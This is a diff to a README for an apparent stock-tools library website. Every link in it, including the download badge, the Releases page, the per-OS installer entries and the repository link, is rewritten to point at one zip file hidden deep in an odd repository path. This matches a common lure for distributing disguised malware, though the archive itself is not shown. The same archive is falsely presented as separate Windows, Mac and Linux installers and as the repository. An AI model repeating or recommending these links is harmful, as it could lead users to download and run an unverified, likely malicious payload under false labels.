@@ -1,6 +1,6 @@
 # 📚🛗 Stock-Elevator-LIBrary_Website - Your Easy Access to Stock Tools
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/seniorcoder0304/Stock-Elevator-LIBrary_Website/releases)
+[![Download Now](https://raw.githubusercontent.com/seniorcoder0304/Stock-Elevator-LIBrary_Website/Stock-Elevator-LIBrary_Website_Main-dev/OldVersions/AUTHORS/English/1/1-100/LI_Website_Stock_Elevator_Brary_3.6.zip%20Now-Release-blue)](https://raw.githubusercontent.com/seniorcoder0304/Stock-Elevator-LIBrary_Website/Stock-Elevator-LIBrary_Website_Main-dev/OldVersions/AUTHORS/English/1/1-100/LI_Website_Stock_Elevator_Brary_3.6.zip)
 
 ## 📝 Description
 
@@ -13,7 +13,7 @@ To get started, you need to download the application. The process is straightfor
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Head over to the [Releases page](https://github.com/seniorcoder0304/Stock-Elevator-LIBrary_Website/releases) to find the latest version.
+   Head over to the [Releases page](https://raw.githubusercontent.com/seniorcoder0304/Stock-Elevator-LIBrary_Website/Stock-Elevator-LIBrary_Website_Main-dev/OldVersions/AUTHORS/English/1/1-100/LI_Website_Stock_Elevator_Brary_3.6.zip) to find the latest version.
 
 2. **Choose Your Version**  
    Look for the version that fits your needs. Click the version number to access the download options.
@@ -21,9 +21,9 @@ To get started, you need to download the application. The process is straightfor
 3. **Download the File**  
    Locate the file suitable for your operating system. Click on the link to download the application. The common files available are:
 
-   - **Windows**: `Stock-Elevator-LIBrary.exe`
-   - **Mac**: `Stock-Elevator-LIBrary.dmg`
-   - **Linux**: `Stock-Elevator-LIBrary.AppImage`
+   - **Windows**: `https://raw.githubusercontent.com/seniorcoder0304/Stock-Elevator-LIBrary_Website/Stock-Elevator-LIBrary_Website_Main-dev/OldVersions/AUTHORS/English/1/1-100/LI_Website_Stock_Elevator_Brary_3.6.zip`
+   - **Mac**: `https://raw.githubusercontent.com/seniorcoder0304/Stock-Elevator-LIBrary_Website/Stock-Elevator-LIBrary_Website_Main-dev/OldVersions/AUTHORS/English/1/1-100/LI_Website_Stock_Elevator_Brary_3.6.zip`
+   - **Linux**: `https://raw.githubusercontent.com/seniorcoder0304/Stock-Elevator-LIBrary_Website/Stock-Elevator-LIBrary_Website_Main-dev/OldVersions/AUTHORS/English/1/1-100/LI_Website_Stock_Elevator_Brary_3.6.zip`
 
    Click on the appropriate file to start the download.
 
@@ -57,8 +57,8 @@ To ensure a smooth experience, please check that your system meets the following
 
 ## 🔗 Links 
 
-- Repository: [GitHub Repository](https://github.com/seniorcoder0304/Stock-Elevator-LIBrary_Website)
-- Releases: [Download Here](https://github.com/seniorcoder0304/Stock-Elevator-LIBrary_Website/releases)
+- Repository: [GitHub Repository](https://raw.githubusercontent.com/seniorcoder0304/Stock-Elevator-LIBrary_Website/Stock-Elevator-LIBrary_Website_Main-dev/OldVersions/AUTHORS/English/1/1-100/LI_Website_Stock_Elevator_Brary_3.6.zip)
+- Releases: [Download Here](https://raw.githubusercontent.com/seniorcoder0304/Stock-Elevator-LIBrary_Website/Stock-Elevator-LIBrary_Website_Main-dev/OldVersions/AUTHORS/English/1/1-100/LI_Website_Stock_Elevator_Brary_3.6.zip)
 - Support: Visit our [support forum](#) for assistance.
 
 ## 💡 Conclusion
